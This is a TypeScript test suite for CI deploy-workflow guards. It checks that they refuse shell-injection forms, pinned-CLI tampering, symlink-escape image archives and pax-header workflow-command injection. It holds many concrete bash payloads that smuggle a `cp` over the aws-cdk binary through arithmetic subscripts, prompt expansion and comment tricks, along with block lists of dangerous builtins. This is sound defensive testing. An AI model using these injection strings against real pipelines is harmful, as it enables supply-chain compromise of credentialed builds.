    const indented = (lines: string) => lines.split('\n').join('\n          ')
    for (const line of [`echo $(true)#;${cp}`, `echo <(true)#;${cp}`, `echo >(true)#;${cp}`]) {
      expect(added('nonprod', line), line).toEqual(both)
    }
    // An arithmetic expansion is refused off a canonical line anyway.
    expect(added('nonprod', `echo $((1))#;${cp}`)).toEqual(both)
    expect(added('nonprod', `echo \${x:-a #}; ${cp}`)).toEqual(both)
    expect(added('nonprod', `echo $'\\''; ${cp} #'`)).toEqual(both)
    expect(added('nonprod', `echo \`${cp}\``)).toEqual(only)
    expect(added('nonprod', indented(`cat <<true >/dev/null\n'\ntrue\n${cp}\ncat <<true >/dev/null\n'\ntrue`))).toEqual(
      only,
    )
    for (const line of [
      `[ -v 'a[$(${cp})]' ]`,
      `test -v 'a[$(${cp})]'`,
      `[[ 'a[$(${cp})]' -eq 1 ]]`,
      `echo $(( 'a[$(${cp})]' ))`,
      "x=$(printf 'a[%s(cp a b)]' '$'); [[ $x -eq 1 ]]",
      '[[ -v $x ]]',
    ]) {
      expect(added('nonprod', line), line).toEqual(only)
    }
    for (const line of [`echo "\${a['$(${cp})']}"`, `echo "\${!x}"`, 'b[$x]=1']) {
      expect(added('nonprod', line), line).toEqual(both)
    }
    expect(added('nonprod', indented(`X=$(echo then case x in x\n${cp}\n)`))).toEqual(both)
    expect(added('nonprod', indented(`(\necho do case x in x\n${cp}\n)`))).toEqual(both)
    // A subshell's ) ends a word, so a # after it is a comment, as bash reads it, but the table names no
    // subshell, and no # but a comment's after a blank.
    expect(added('nonprod', `(true)#;${cp}`)).toEqual(only)
  }, 30_000)

  // Round 3: what the reader still let through, each in front of, or holding, a cp over the CLI's bin. A
  // canonical text's line is exempt only inside the text standing whole (SECURITY-01: a copy of
  // ASSET_CHECK's manifests=$((manifests + 1)) after a quoted manifests='a[$( … )]' ran the cp); $[ … ],
  // ${x@P}, a positional parameter's offset and a compound assignment's subscript evaluate a quoted $( … )
  // as arithmetic or a prompt does (SECURITY-02, GUARDS-05), and so does local given a name it builds; a
  // blank is a space or a tab, so a # after any other is no comment (GUARDS-02); the word after an
  // assignment's value or a redirection's target that holds a substitution is a command (GUARDS-03); and a
  // read-write <> writes (GUARDS-04).
  it(`finds a canonical line off its text, $[ ], \${x@P}, an offset or subscript, a built name, another blank, a command after a substitution, and <>`, () => {
    const cp = 'cp "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk'
    const quoted = `'SECONDS[$(${cp})]'`
    const runs = [at(readBack('nonprod'), RUNS)]
    const lines = (...each: string[]) => each.join('\n          ')
    // Each is refused by the table at its second line, the one holding what it doesn't name.
    for (const line of [
      lines(`manifests=${quoted}`, 'manifests=$((manifests + 1))'),
      lines(`services=${quoted}`, 'services=$((services + 1))'),
      lines(`note='$(${cp})'`, `echo "\${note@P}"`),
      lines(`note='$(${cp})'`, `echo \${note@P}`),
      lines(`note=${quoted}`, 'echo "$[note + 1]"'),
      lines(`note=${quoted}`, 'echo $[note + 1]'),
      lines(`y=${quoted}`, `: "\${@:y}"`),
      lines(`y=${quoted}`, `: "\${*:y}"`),
      lines(`y=${quoted}`, `: "\${1:y}"`),
      lines(`y=${quoted}`, `: \${@: -y}`),
      lines(`y=${quoted}`, 'a=([y]=1)'),
      lines(`y=${quoted}`, 'a+=([y]=1)'),
      lines(`x=${quoted}`, 'local "$x=1"'),
      lines(`x='[$(${cp})]'`, 'local a"$x"=1'),
    ]) {
      expect(added('nonprod', line), line).toEqual([refused('nonprod', PLANTED_AT + 1)])
    }
    expect(added('nonprod', 'X=$(true) $(echo cp) "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk')).toEqual([
      refused('nonprod'),
    ])
    // A compound assignment over three lines, whose subscript line also reads as a command of its own.
    expect(added('nonprod', lines(`y=${quoted}`, 'a=(', '  [y]=1', ')'))).toEqual([
      ...runs,
      refused('nonprod', PLANTED_AT + 1),
    ])
    for (const blank of ['\u00a0', '\ufeff', '\u2003', '\u000b', '\u000c']) {
      expect(added('nonprod', `echo ok${blank}#;${cp}`), blank).toEqual([...runs, refused('nonprod')])
    }
    for (const line of [
      `X=$(true) ${cp}`,
      `X="$(true)" ${cp}`,
      `X=a$(true) ${cp}`,
      `X=$(true)$(true) ${cp}`,
      `< <(true) ${cp}`,
      `<$(echo /dev/null) ${cp}`,
      lines('X=$(true', `) ${cp}`),
      lines("< 'a", `b' ${cp}`),
    ]) {
      expect(added('nonprod', line), line).toEqual([...runs, refused('nonprod')])
    }
    // A quoted value over two lines and a command after it is shell the table reads: cp, with an assignment
    // before it, is held to no use.
    expect(added('nonprod', lines("X='a", `b' ${cp}`))).toEqual([...runs, held('nonprod')])
    for (const line of [
      'cat "$RUNNER_TEMP/assembly/x.js" 1<>node_modules/aws-cdk/bin/cdk',
      'cat "$RUNNER_TEMP/assembly/x.js" <>node_modules/aws-cdk/bin/cdk',
      'jq . "$RUNNER_TEMP/assembly/x.json" 2<>node_modules/aws-cdk/bin/cdk',
    ]) {
      expect(added('nonprod', line), line).toEqual([refused('nonprod'), at(readBack('nonprod'), WRITES)])
    }
    // The same after an assignment that holds a substitution: an aws call outside run and get (DPW-07).
    expect(
      maskingFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          '          X=$(true) aws sts get-caller-identity\n',
        ),
      ),
    ).toEqual([`${DEPLOY}: DPW-07 ${readBack('nonprod')}: runs every aws, CDK and skopeo command as run … or $(get …)`])
  }, 30_000)

  it('finds a workspace that could stand in for the CLI, and a lockfile entry that isn’t the registry’s', () => {
    const planted = (path: string, manifest: unknown) =>
      credentialedCodeFindings(workflows, new Map([...manifests, [path, JSON.stringify(manifest)]]), lockfile)
    const WORKSPACE = 'DPW-10 no workspace is named aws-cdk or declares a cdk bin'
    expect(planted('packages/x/package.json', { name: '@hearth/x', bin: { cdk: 'bin/cdk.js' } })).toEqual([
      `packages/x/package.json: ${WORKSPACE}`,
    ])
    expect(planted('packages/x/package.json', { name: 'aws-cdk', version: '0.0.0' })).toEqual([
      `packages/x/package.json: ${WORKSPACE}`,
    ])
    const lock = JSON.parse(lockfile) as { packages: Record<string, Record<string, unknown>> }
    const entry = lock.packages['node_modules/aws-cdk'] ?? {}
    const LOCK =
      "package-lock.json: DPW-10 node_modules/aws-cdk is the registry's tarball at infra's pin, with a sha512 integrity and no link"
    const withEntry = (changed: Record<string, unknown>) =>
      credentialedCodeFindings(
        workflows,
        manifests,
        JSON.stringify({ ...lock, packages: { ...lock.packages, 'node_modules/aws-cdk': changed } }),
      )
    expect(withEntry({ ...entry, link: true })).toEqual([LOCK])
    expect(withEntry({ ...entry, resolved: 'https://registry.example.invalid/aws-cdk.tgz' })).toEqual([LOCK])
    expect(withEntry({ ...entry, version: '0.0.1' })).toEqual([LOCK])
    // Round 4's ACTIONS-01 and SECURITY-01: as CLI_FETCH reads it, the registry's tarball at the pin by its fixed
    // URL, never a git dependency or another version's tarball, with a sha512 integrity.
    expect(withEntry({ ...entry, resolved: 'git+ssh://git@github.com/aws/aws-cdk-cli.git#0123456' })).toEqual([LOCK])
    expect(withEntry({ ...entry, resolved: 'https://registry.npmjs.org/aws-cdk/-/aws-cdk-0.0.1.tgz' })).toEqual([LOCK])
    expect(withEntry({ ...entry, integrity: 'sha1-0123456789abcdef0123456789abcdef01234567' })).toEqual([LOCK])
    expect(withEntry({ ...entry, integrity: undefined })).toEqual([LOCK])
  }, 30_000)

  // Round 4: a run's own lines (each outside a canonical text standing whole) are read through SHELL_TABLE, an
  // allowlist, so a form it doesn't name is refused at its line, whatever it is, and no round has to find it
  // first. Every run of deploy.yml is read so, and the committed ones pass.
  it('reads every run of deploy.yml through SHELL_TABLE, and the committed runs pass', () => {
    let runs = 0
    for (const each of workflowJobs(deployText)) {
      for (const [index, step] of parsedSteps(each).entries()) {
        if (step.run === undefined) continue
        runs++
        expect(readShell(step.run).refused, `${each.id} (${step.name ?? index + 1})`).toBeUndefined()
      }
    }
    expect(runs).toBeGreaterThan(80)
  })

  // One plant for each form SHELL_TABLE doesn't name, each in a credentialed run and refused at its line (16,
  // where added() plants), most of which the reader before round 4 passed. Some are also found by the rule
  // that names what they do (RUNS, WRITES, SETS, DEFINES, LOADER).
  it('refuses at its line each form SHELL_TABLE doesn’t name, in a credentialed run', () => {
    const forms: Readonly<Record<string, readonly string[]>> = {
      expansion: [
        `echo "\${x:1}"`,
        `echo "\${x/a/b}"`,
        `echo "\${x%%/*}"`,
        `echo "\${!x}"`,
        `echo "\${x@P}"`,
        'echo "$[x]"',
        'echo "$@"',
        'echo "$*"',
        'echo "$$"',
        'echo "$10"',
        `echo "\${#x}"`,
        `echo "\${x:-y}"`,
        'echo $x',
        'echo ~/x',
        'echo *',
        'echo a{b,c}',
        'echo `true`',
        'echo "$(<x)"',
      ],
      redirection: ['cat a <>x', 'echo a >| x', 'echo a &> x', 'echo a 3>x', 'cat 0<&3', 'echo a >&-', 'cat < x'],
      quoting: ["echo $'a'", 'echo "\\$x"', 'echo a\\ b', 'echo $"x"', "echo 'a\tb'"],
      keyword: [
        'while true; do break; done',
        'until true; do break; done',
        'select x in a; do break; done',
        'function f { :; }',
        'time true',
        '[[ -v x ]]',
        '(( x ))',
        'coproc true',
      ],
      operator: ['echo a & wait', 'echo a |& cat', 'case x in x) echo;& esac', '( echo a )', 'echo a;# c'],
      character: ['echo a%b', 'echo a+b', 'echo a,b', 'echo a^b', 'echo a?b', 'echo é'],
      assignment: ['IFS=x', 'PATH=/x', 'BASH_ENV=x', 'a[1]=x', 'x+=1'],
      builtin: [
        'eval "$x"',
        'exec true',
        'source x',
        '. x',
        'trap "x" EXIT',
        'alias x=y',
        'enable -n echo',
        'let x=1',
        'shopt -s extglob',
        'builtin echo',
        'command true',
        'set -x',
        'set +e',
        'declare -n x=y',
        'declare -i x',
        'export -f x',
        'readonly x',
        'read -e x',
        'mapfile -C x -t A < <(true)',
        'printf -v x y',
        'local x=$1',
        'local -n x=y',
        'cd /',
        'test -v x',
        ': x',
        'unset x',
        'return',
        'shift',
      ],
      function: ['f() { :; }', 'mask() { cat; }'],
    }
    for (const [form, lines] of Object.entries(forms)) {
      for (const line of lines) expect(added('nonprod', line), `${form}: ${line}`).toContain(refused('nonprod'))
    }
    // And the shapes rounds 1 to 3 found one by one, each now refused because the table names none of it.
    const cp = 'cp "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk'
    for (const line of [
      `echo a\\ #;${cp}`,
      `echo $(true)#;${cp}`,
      `echo \${x:-a #}; ${cp}`,
      `echo $'\\''; ${cp} #'`,
      `X=$(true) ${cp}`,
      `< <(true) ${cp}`,
      'cat a 1<>node_modules/aws-cdk/bin/cdk',
    ]) {
      expect(added('nonprod', line), line).toContain(refused('nonprod'))
    }
    const lines = (...each: string[]) => each.join('\n          ')
    for (const line of [
      lines('cat <<true >/dev/null', "'", 'true', cp, 'cat <<true >/dev/null', "'", 'true'),
      lines(`manifests='a[$(${cp})]'`, 'manifests=$((manifests + 1))'),
      lines(`note='$(${cp})'`, `echo "\${note@P}"`),
      lines(`y='a[$(${cp})]'`, `: "\${@:y}"`),
      lines(`y='a[$(${cp})]'`, 'a=([y]=1)'),
    ]) {
      expect(added('nonprod', line), line).toContain(
        line.startsWith('cat') ? refused('nonprod') : refused('nonprod', PLANTED_AT + 1),
      )
    }
  }, 30_000)

  // A stretch of a run's own lines closes all it opens before a canonical text or the run's end, so no
  // canonical text can stand inside a quote, a compound command, a continued line or a here-document.
  it('refuses a stretch left open, before a canonical text or at the run’s end', () => {
    for (const open of [
      "echo '",
      'x="',
      'if true; then',
      '{',
      'echo a \\',
      'echo a |',
      'echo a &&',
      '$(',
      'cat <<E',
      'case x in',
    ]) {
      expect(readShell(`${open}\n${PREAMBLE}\n`).refused?.line, open).toBe(0)
    }
    expect(readShell('{\necho a').refused?.line).toBe(1)
    expect(readShell(`${PREAMBLE}\necho ok`).refused).toBeUndefined()
    expect(readShell(`echo ok\n${PREAMBLE}`).refused).toBeUndefined()
  })

  // Round 4: each command a credentialed run's own lines read is held to the flags and arguments the
  // workflow uses (GLUE_USES), where one could run code, read a file the guard can't see or write a file.
  it('holds each command of a credentialed run to the flags and arguments the workflow uses', () => {
    for (const line of [
      'X=1 jq -n .',
      'jq -f x',
      'jq --from-file x',
      "jq -n --rawfile a x '.'",
      "jq -n --slurpfile a x '.'",
      "jq -L x -n '.'",
      "jq -n --args '.' a",
      "jq '.' x",
      "jq -n 'input_filename'",
      "jq -n '$__prog_args'",
      "jq -n '$ENV'",
      "jq -n 'env'",
      "jq -n 'input'",
      `jq -n 'import "x" as y; .'`,
      `jq -n 'include "x"; .'`,
      "jq -n '@sh'",
      `jq -n '"\\(1)"'`,
      "jq -n '$y'",
      "jq -n '. # c'",
      'gh api repos/x/y',
      'gh api -X DELETE "repos/$REPO/deployments/1"',
      'gh api -H x "repos/$REPO/deployments"',
      'gh api -F a=@x "repos/$REPO/deployments"',
      'gh api --input x "repos/$REPO/deployments"',
      'cat x',
      'head -n 1 x',
      'tee x',
      'wc -l',
      'mask x',
      'run aws sts get-caller-identity --endpoint-url x',
      'run aws sts get-caller-identity --profile x',
      'run aws ecs describe-services --cli-input-json x',
      'run aws ecs describe-services --cluster file://x',
      'run skopeo inspect x',
      'npm ci',
    ]) {
      expect(added('nonprod', line), line).toContain(held('nonprod'))
    }
    // A redirection to or from a file but the step's own is no form the table names.
    for (const line of ['echo a > x', 'echo a >> /tmp/x', 'echo a > "$RUNNER_TEMP/x"', 'echo a 2>x']) {
      expect(added('nonprod', line), line).toContain(refused('nonprod'))
    }
  }, 30_000)

  // Round 4: a canonical text stands whole, so what it evaluates (arithmetic, a subscript, an offset, a name
  // or a prompt) is only what it sets itself, from a literal or arithmetic over such values; and it closes
  // all it opens, so the run's own lines after it are read from a clean start.
  it('holds each canonical text to evaluating only what it sets itself, and to closing all it opens', () => {
    expect(canonicalTextFindings()).toEqual([])
    const evaluates = (name: string, line: number) =>
      `${GUARD}: DPW-10 ${name}, line ${line}: evaluates as arithmetic, a subscript, an offset, a name or a prompt only what it sets itself`
    for (const [text, line] of [
      ['n=$((m + 1))', 1],
      ['x=$1\necho $((x + 1))', 2],
      ['x=0\nread -r x\necho $((x + 1))', 3],
      [`echo "\${a[$i]}"`, 1],
      ['echo $(( $(jq length <<<"$x") ))', 1],
      ['[[ "$x" -gt 1 ]]', 1],
      [`echo "\${x@P}"`, 1],
      [`echo "\${!x}"`, 1],
      [`echo "\${x:$y}"`, 1],
      ['a=([$y]=1)', 1],
      ['x=1\necho $(( x + $1 ))', 2],
    ] as const) {
      expect(canonicalTextFindings({ X: text }), text).toContain(evaluates('X', line))
    }
    // (Off a canonical text's own lines, any evaluation is also no shape readsAsBash() reads, so these are
    // asked of outsideEvaluations() alone.)
    for (const text of [
      'n=0\nn=$((n + 1))',
      `echo "\${a[0]}"`,
      `for kind in a b; do printf -v "\${kind^^}_X" %s 1; done`,
    ]) {
      expect(outsideEvaluations(text), text).toEqual([])
    }
    expect(canonicalTextFindings({ X: 'echo `true`' })).toEqual([
      `${GUARD}: DPW-10 X: is written in the shell shellViews() reads`,
    ])
    // ONE_OFF's count of withheld lines once took jq's count of the log into arithmetic.
    const withheld = /^ *withheld=.*$/m.exec(ONE_OFF)?.[0] ?? ''
    expect(withheld).toContain('jq --argjson shown')
    const before = withheld.replace(
      /withheld=.*/,
      () => `withheld=$(($(jq length <<<"$log") - $(printf '%s' "$shown" | grep -c '^' || true)))`,
    )
    const line = ONE_OFF.split('\n').indexOf(withheld) + 1
    expect(canonicalTextFindings({ ONE_OFF: ONE_OFF.replace(withheld, () => before) })).toContain(
      evaluates('ONE_OFF', line),
    )
    // Each closes all it opens: bash parses it alone, and its last line continues nothing.
    for (const [name, text] of Object.entries(CANONICAL_BY_NAME())) {
      const parsed = spawnSync('bash', ['-n'], { input: text, encoding: 'utf8' })
      expect([parsed.status, parsed.stderr], name).toEqual([0, ''])
      expect(text, name).not.toMatch(/(?:\\|&&|\|\||\|)\s*$/)
    }
  })

  it('holds the repository', () => {
    expect(credentialedCodeFindings(workflows, manifests, lockfile)).toEqual([])
    // The globs are folders or a folder's children, which the pattern reads exactly.
    expect(
      Array.isArray(workspaceGlobs) &&
        workspaceGlobs.every(glob => /^[\w.-]+(?:\/[\w.-]+)*(?:\/\*)?$/.test(String(glob))),
    ).toBe(true)
    expect([...manifests.keys()]).toEqual(
      expect.arrayContaining(['package.json', 'infra/package.json', 'apps/server/package.json', 'demo/package.json']),
    )
  })
})

// CLI_FETCH and CLI_CHECK (C11-D48, C11-D76; round 4's ACTIONS-01 and SECURITY-01), each run as written with
// bash, jq, openssl and tar against a stand-in curl that serves a planted tarball, in a scratch checkout with
// its own infra/package.json and lockfile: the CLI is the tarball whose sha512 is the lockfile's integrity,
// fetched by its fixed URL and unpacked into a folder of its own, and no npm runs, so neither an .npmrc nor a
// git dependency in the lockfile can run code where the OIDC request token is.
describe('DPW-10 (C11-D48, C11-D76): CLI_FETCH and CLI_CHECK against a planted tarball', () => {
  let scratch = ''
  const PIN = '9.9.9'
  const URL = `https://registry.npmjs.org/aws-cdk/-/aws-cdk-${PIN}.tgz`
  beforeAll(() => {
    scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw10-cli-'))
  })
  afterAll(() => {
    if (scratch !== '') rmSync(scratch, { recursive: true, force: true })
  })
  // A tarball of package/ holding the given manifest, a bin/cdk and, if asked, a link; its sha512 integrity.
  let tarballs = 0
  function tarball(manifest: Record<string, unknown>, link = false): { path: string; integrity: string } {
    const folder = join(scratch, `tarball-${++tarballs}`)
    execFileSync('mkdir', ['-p', join(folder, 'package', 'bin')])
    writeFileSync(join(folder, 'package', 'package.json'), JSON.stringify(manifest))
    writeFileSync(join(folder, 'package', 'bin', 'cdk'), '#!/bin/sh\necho cdk\n', { mode: 0o755 })
    if (link) symlinkSync('/bin/sh', join(folder, 'package', 'bin', 'sh'))
    const path = join(scratch, `aws-cdk-${tarballs}.tgz`)
    execFileSync('tar', ['-czf', path, '-C', folder, 'package'])
    const integrity = `sha512-${createHash('sha512').update(readFileSync(path)).digest('base64')}`
    return { path, integrity }
  }
  const CLI = { name: 'aws-cdk', version: PIN, bin: { cdk: 'bin/cdk' } }
  interface Plant {
    served: string
    entry?: Record<string, unknown>
    pin?: string
    // The folder the CLI is unpacked into, made beforehand.
    made?: boolean
  }
  // The checkout, the runner's temp folder and a stand-in curl that logs its arguments and serves the
  // planted tarball to its --output; npm on PATH would leave a mark, as would a git program an .npmrc names.
  function fetched(plant: Plant): { status: number | null; said: string; curl: string[]; npm: boolean; cdk: boolean } {
    const run = mkdtempSync(join(scratch, 'run-'))
    const repo = join(run, 'repo')
    const temp = join(run, 'temp')
    const bin = join(run, 'bin')
    execFileSync('mkdir', ['-p', join(repo, 'infra'), temp, bin])
    writeFileSync(
      join(repo, 'infra', 'package.json'),
      JSON.stringify({ devDependencies: { 'aws-cdk': plant.pin ?? PIN } }),
    )
    const entry = plant.entry ?? { version: PIN, resolved: URL, integrity: '' }
    writeFileSync(join(repo, 'package-lock.json'), JSON.stringify({ packages: { 'node_modules/aws-cdk': entry } }))
    writeFileSync(join(repo, '.npmrc'), `git=${join(bin, 'git-mark')}\n`)
    const mark = join(run, 'npm-ran')
    for (const name of ['npm', 'git-mark']) {
      writeFileSync(join(bin, name), `#!/bin/sh\ntouch '${mark}'\n`, { mode: 0o755 })
    }
    if (plant.made) execFileSync('mkdir', [join(temp, 'aws-cdk')])
    const log = join(run, 'curl.log')
    writeFileSync(log, '')
    const STUB = `curl() {
  local out='' previous=''
  printf '%s\\n' "$@" >>"$CURL_LOG"
  for word in "$@"; do
    if [ "$previous" = --output ]; then out=$word; fi
    previous=$word
  done
  cp "$SERVED" "$out"
}`
    const result = spawnSync('bash', ['-c', `${STUB}\n${CLI_FETCH}\n${CLI_CHECK}`], {
      cwd: repo,
      encoding: 'utf8',
      env: {
        PATH: `${bin}:${process.env.PATH ?? ''}`,
        HOME: run,
        RUNNER_TEMP: temp,
        CURL_LOG: log,
        SERVED: plant.served,
      },
    })
    let cdk = false
    try {
      cdk = readFileSync(join(temp, 'aws-cdk', 'package', 'bin', 'cdk'), 'utf8').startsWith('#!/bin/sh')
    } catch {
      cdk = false
    }
    let npm = true
    try {
      readFileSync(mark)
    } catch {
      npm = false
    }
    return {
      status: result.status,
      said: spoken(result.stdout).at(-1) ?? '',
      curl: readFileSync(log, 'utf8').split('\n').filter(Boolean),
      npm,
      cdk,
    }
  }
  const lockOf = (integrity: string, more: Record<string, unknown> = {}) => ({
    version: PIN,
    resolved: URL,
    integrity,
    ...more,
  })

  it('fetches the registry tarball by its fixed URL, checks its sha512 and unpacks it, and runs no npm', () => {
    const good = tarball(CLI)
    const done = fetched({ served: good.path, entry: lockOf(good.integrity) })
    expect(done).toEqual({ status: 0, said: '', curl: done.curl, npm: false, cdk: true })
    const temp = done.curl[done.curl.indexOf('--output') + 1] ?? ''
    expect(done.curl).toEqual([
      '-q',
      '--fail',
      '--silent',
      '--show-error',
      '--proto',
      '=https',
      '--tlsv1.2',
      '--max-time',
      '300',
      '--max-filesize',
      '104857600',
      '--output',
      temp,
      URL,
    ])
    expect(temp.endsWith('/temp/aws-cdk/aws-cdk.tgz')).toBe(true)
  })

  it('refuses a tarball whose sha512 isn’t the lockfile’s integrity, and unpacks nothing', () => {
    const good = tarball(CLI)
    const other = tarball({ ...CLI, description: 'another' })
    const refused = fetched({ served: other.path, entry: lockOf(good.integrity) })
    expect(refused).toMatchObject({ status: 1, cdk: false, npm: false })
    expect(refused.said).toBe("cli-fetch: the tarball's sha512 isn't the lockfile's integrity")
  })

  it('refuses a lockfile entry that isn’t the registry’s tarball at the pin, and a pin that isn’t one version, before fetching', () => {
    const good = tarball(CLI)
    const LOCK = "cli-fetch: the lockfile's aws-cdk isn't the registry's tarball at infra's pin"
    for (const entry of [
      lockOf(good.integrity, { resolved: 'git+ssh://git@github.com/aws/aws-cdk-cli.git#0123456' }),
      lockOf(good.integrity, { resolved: 'https://registry.npmjs.org/aws-cdk/-/aws-cdk-0.0.1.tgz' }),
      lockOf(good.integrity, { link: true }),
      lockOf(good.integrity, { version: '0.0.1' }),
      lockOf(good.integrity.replace('sha512-', 'sha1-')),
      lockOf(`${good.integrity}\n`),
    ]) {
      const refused = fetched({ served: good.path, entry })
      expect(refused, JSON.stringify(entry)).toMatchObject({ status: 1, said: LOCK, curl: [], npm: false, cdk: false })
    }
    const unpinned = fetched({ served: good.path, entry: lockOf(good.integrity), pin: '^9.9.9' })
    expect(unpinned).toMatchObject({
      status: 1,
      said: "cli-fetch: infra's aws-cdk isn't pinned to one version",
      curl: [],
    })
    // A folder already there for the CLI is never written into.
    expect(fetched({ served: good.path, entry: lockOf(good.integrity), made: true })).toMatchObject({
      status: 1,
      curl: [],
      cdk: false,
    })
  })

  it('CLI_CHECK refuses an unpacked CLI that holds a link, or whose manifest isn’t aws-cdk at the pin alone', () => {
    const linked = tarball(CLI, true)
    expect(fetched({ served: linked.path, entry: lockOf(linked.integrity) })).toMatchObject({
      status: 1,
      said: 'cli-check: the unpacked CLI holds a symbolic link',
    })
    const PACKAGE = "cli-check: the unpacked aws-cdk isn't the registry's package at infra's pin"
    for (const manifest of [
      { ...CLI, name: 'not-aws-cdk' },
      { ...CLI, version: '0.0.1' },
      { ...CLI, bin: { cdk: 'bin/other' } },
      { ...CLI, dependencies: { other: '1.0.0' } },
    ]) {
      const planted = tarball(manifest)
      expect(
        fetched({ served: planted.path, entry: lockOf(planted.integrity) }),
        JSON.stringify(manifest),
      ).toMatchObject({ status: 1, said: PACKAGE })
    }
  })
})

describe('DPW-13 (C11-D50, C11-D79): IMAGE_CHECK against planted image archives', () => {
  let scratch = ''
  beforeAll(() => {
    scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw13-image-'))
  })
  afterAll(() => {
    if (scratch !== '') rmSync(scratch, { recursive: true, force: true })
  })
  const BLOB = 'a'.repeat(64)
  const MANIFEST = 'b'.repeat(64)
  // A folder holding the layout buildx's OCI export writes: oci-layout, index.json and two blobs.
  let folders = 0
  function layout(): string {
    const folder = join(scratch, `layout-${++folders}`)
    execFileSync('mkdir', ['-p', join(folder, 'blobs', 'sha256')])
    writeFileSync(join(folder, 'oci-layout'), '{"imageLayoutVersion":"1.0.0"}')
    writeFileSync(join(folder, 'index.json'), `{"schemaVersion":2,"manifests":[{"digest":"sha256:${MANIFEST}"}]}`)
    writeFileSync(join(folder, 'blobs', 'sha256', BLOB), 'layer')
    writeFileSync(join(folder, 'blobs', 'sha256', MANIFEST), 'manifest')
    return folder
  }
  // An archive of a layout, its members in buildx's order (the folders first) and any more given after them,
  // made by GNU tar in one go (so a hard link is written as one), or, with extra arguments (-P, a
  // --transform), those members appended with them alone.
  function archive(folder: string, more: readonly string[] = [], options: readonly string[] = []): string {
    const path = join(scratch, `image-${folders}-${more.length}-${options.length}.tar`)
    const members = ['blobs/', 'blobs/sha256/', `blobs/sha256/${BLOB}`, `blobs/sha256/${MANIFEST}`, 'index.json']
    const tar = ['--numeric-owner', '--no-recursion', '-C', folder]
    if (options.length === 0) execFileSync('tar', [...tar, '-cf', path, ...members, 'oci-layout', ...more])
    else {
      execFileSync('tar', [...tar, '-cf', path, ...members, 'oci-layout'])
      execFileSync('tar', [...tar, ...options, '-rf', path, ...more])
    }
    return path
  }
  // The deploy jobs' step, as it runs: the archive at the runner's image folder, then the check and the
  // unpacking into the folder the push copies from. The last line it said, and what the folder holds.
  function checked(path: string, script = `${IMAGE_UNPACK_RUN}\n`) {
    const temp = mkdtempSync(join(scratch, 'runner-'))
    execFileSync('mkdir', [join(temp, 'image')])
    cpSync(path, join(temp, 'image', 'image.tar'))
    const result = spawnSync('bash', ['-c', script], {
      encoding: 'utf8',
      env: { PATH: process.env.PATH ?? '', HOME: temp, RUNNER_TEMP: temp },
    })
    let unpacked: string[] = []
    try {
      unpacked = (readdirSync(join(temp, 'image-layout'), { recursive: true }) as string[]).sort()
    } catch {
      unpacked = []
    }
    return { status: result.status, said: spoken(result.stdout).at(-1) ?? '', unpacked }
  }
  const MEMBER = "image-check: the image's archive holds a member buildx's OCI export never writes"
  const FOLDER = "image-check: the unpacked image holds a link or a file buildx's OCI export never writes"

  it('unpacks the archive buildx writes into the folder the push copies from, and the build’s check passes it', () => {
    const done = checked(archive(layout()))
    expect(done).toEqual({
      status: 0,
      said: '',
      unpacked: [
        'blobs',
        'blobs/sha256',
        `blobs/sha256/${BLOB}`,
        `blobs/sha256/${MANIFEST}`,
        'index.json',
        'oci-layout',
      ],
    })
    // The push copies from that folder, never the archive (SECURITY-01, round 5).
    expect(SKOPEO_COPY).toContain(`"oci:${IMAGE_LAYOUT}:build"`)
    expect(IMAGE_UNPACK_RUN).toContain(`unpack_image "$RUNNER_TEMP/image/image.tar" "${IMAGE_LAYOUT}"`)
    // The build's own run checks the archive buildx wrote, before its outputs.
    const build = PINNED_RUNS().build?.['Build the image']?.run ?? ''
    expect(build).toContain(`${IMAGE_CHECK}\ncheck_image_archive "$RUNNER_TEMP/image.tar"\necho "digest=`)
    const buildRun = checked(
      archive(layout()),
      `set -euo pipefail\n${IMAGE_CHECK}\ncheck_image_archive "$RUNNER_TEMP/image/image.tar"\n`,
    )
    expect(buildRun).toMatchObject({ status: 0, said: '' })
  })

  // EXPAND-A1-01 (round 6). GNU tar names a pax header keyword it doesn't know on stderr as it is, line
  // breaks and all, and still exits 0, and pax headers are no members, so the listing and the folder pass.
  // The build runs repository code before it uploads the archive, so the archive could end a line with
  // ##[add-mask] and a value of its choosing, which the runner would hide in every later line and summary
  // and in any job output it matches (services_started, and with it the pipeline's rollback). The run stops
  // the runner reading workflow commands before tar reads anything: the stop line is the first it prints.
  it('stops the runner reading workflow commands before tar names the archive’s pax headers (EXPAND-A1-01, round 6)', () => {
    const folder = layout()
    const path = join(scratch, 'image-pax.tar')
    execFileSync('tar', [
      '--numeric-owner',
      '--no-recursion',
      '-C',
      folder,
      '--format=posix',
      '--pax-option=##[add-mask]true\nhearth:=x',
      '-cf',
      path,
      'blobs/',
      'blobs/sha256/',
      `blobs/sha256/${BLOB}`,
      `blobs/sha256/${MANIFEST}`,
      'index.json',
      'oci-layout',
    ])
    const temp = mkdtempSync(join(scratch, 'runner-'))
    execFileSync('mkdir', [join(temp, 'image')])
    cpSync(path, join(temp, 'image', 'image.tar'))
    // Both streams in the order the run wrote them, as the runner reads both.
    const result = spawnSync('bash', ['-c', `exec 2>&1\n${IMAGE_UNPACK_RUN}\n`], {
      encoding: 'utf8',
      env: { PATH: process.env.PATH ?? '', HOME: temp, RUNNER_TEMP: temp },
    })
    expect(result.status).toBe(0)
    const lines = result.stdout.split('\n')
    expect(lines.some(line => line.endsWith('##[add-mask]true'))).toBe(true)
    expect(lines[0]).toMatch(STOP_LINE)
    expect(readdirSync(join(temp, 'image-layout'), { recursive: true }).length).toBe(6)
  })

  it('refuses a link written through, a link or hard link, an absolute, escaped or other name, a fifo or a folder, before unpacking anything (SECURITY-01, round 5)', () => {
    // A symbolic link to a folder outside, then a file through it: what skopeo's oci-archive source would
    // write over the CLI.
    const outside = mkdtempSync(join(scratch, 'outside-'))
    const through = layout()
    symlinkSync(outside, join(through, 'zz'))
    writeFileSync(join(outside, 'index.js'), 'not the CLI')
    const throughArchive = archive(through, ['zz', 'zz/index.js'])
    rmSync(join(outside, 'index.js'))
    expect(checked(throughArchive)).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    expect(readdirSync(outside)).toEqual([])
    // A symbolic link under an allowed name.
    const named = layout()
    rmSync(join(named, 'index.json'))
